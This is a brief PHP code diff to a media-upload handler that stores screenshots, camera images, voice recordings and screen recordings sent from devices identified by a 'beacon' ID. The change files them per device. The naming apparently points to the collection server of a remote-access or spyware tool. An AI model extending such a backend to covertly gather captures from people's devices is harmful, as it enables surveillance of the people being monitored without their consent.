@@ -12,7 +12,8 @@ function handleMediaUpload(): void {
     $extMap = ['screenshot' => 'png', 'camera' => 'jpg', 'voice' => 'mp3', 'screen_record' => 'mp4'];
     $ext = $extMap[$type] ?? 'bin';
     $name = $type . '_' . time() . '.' . $ext;
-    $dest = MEDIA_DIR . '/' . $name;
+    $dir = ensureDeviceDir($uuid) . '/media';
+    $dest = $dir . '/' . $name;
     file_put_contents($dest, base64_decode($data));
     $id = DB::connect()->insert('media', ['beacon_uuid' => $uuid, 'type' => $type, 'filename' => $name, 'path' => $dest, 'created_at' => now()]);
     jsonOut(['id' => $id, 'status' => 'uploaded'], 201);
